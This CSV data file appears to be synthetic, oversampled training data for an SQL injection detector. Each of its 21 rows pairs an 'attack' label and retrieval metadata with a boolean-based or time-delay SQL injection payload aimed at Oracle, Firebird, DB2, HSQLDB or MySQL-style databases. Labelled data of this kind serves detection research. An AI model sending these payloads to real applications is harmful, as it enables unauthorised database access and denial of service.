id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'cixa' like 'cixa",nearest_attack_euclidean,R000271,1.294101788949367
SMOTE_000002,attack,boolean,"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ycuo"" like ""ycuo",nearest_attack_euclidean,R000212,1.65919454445891
SMOTE_000003,attack,boolean,"-1072%""   )    )    or 3090  =  3539",nearest_attack_euclidean,R000155,0.44381674585626685
SMOTE_000004,attack,boolean,"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'hqqj'  =  'hqqj",nearest_attack_euclidean,R000234,0.6287109893788396
SMOTE_000005,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""vwep"" like ""vwep",nearest_attack_euclidean,R000129,0.13025155431329366
SMOTE_000006,attack,boolean,"1%"" and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000067,0.9160220251391786
SMOTE_000007,attack,boolean,"1%' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000099,0.6483612150557115
SMOTE_000008,attack,boolean,-8710 or 9323  =  9323#,nearest_attack_euclidean,R000199,1.5100804939553174
SMOTE_000009,attack,boolean,or 'text'   =   n'text',nearest_attack_euclidean,R000012,2.1141167049784815
SMOTE_000010,attack,boolean,"1""  )   where 7919  =  7919 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000138,1.047803584699923
SMOTE_000011,attack,boolean,1'+  (  select bfeq where 3445  =  3445 and 9198  =  9198--,nearest_attack_euclidean,R000297,0.33305654439961335
SMOTE_000012,attack,boolean,"1%""   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000311,0.36254884367823365
SMOTE_000013,attack,boolean,"-8409%'  )   or make_set  (  9354  =  9354,7185  )   and   (  '%'  =  '",nearest_attack_euclidean,R000151,0.21013192002972603
SMOTE_000014,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",nearest_attack_euclidean,R000089,0.18755815091843067
SMOTE_000015,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000132,0.33680224692952004
SMOTE_000016,attack,boolean,-2036'  )   or   (  8459  =  8459  )  *4906 and   (  'hjeu'  =  'hjeu,nearest_attack_euclidean,R000254,0.05592021554062882
SMOTE_000017,attack,boolean,"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000306,0.9907923601965025
SMOTE_000018,attack,boolean,1  )   as qgsb where 7600  =  7600 and 2006  =  2006,nearest_attack_euclidean,R000037,1.628449742331073
SMOTE_000019,attack,boolean,"1%' and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000232,0.5467447395257535
SMOTE_000020,attack,boolean,-8665' or 6825  =  7840 and 'vbsy' like 'vbsy,nearest_attack_euclidean,R000029,1.4733506749849292
SMOTE_000021,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000121,0.40552717183070874
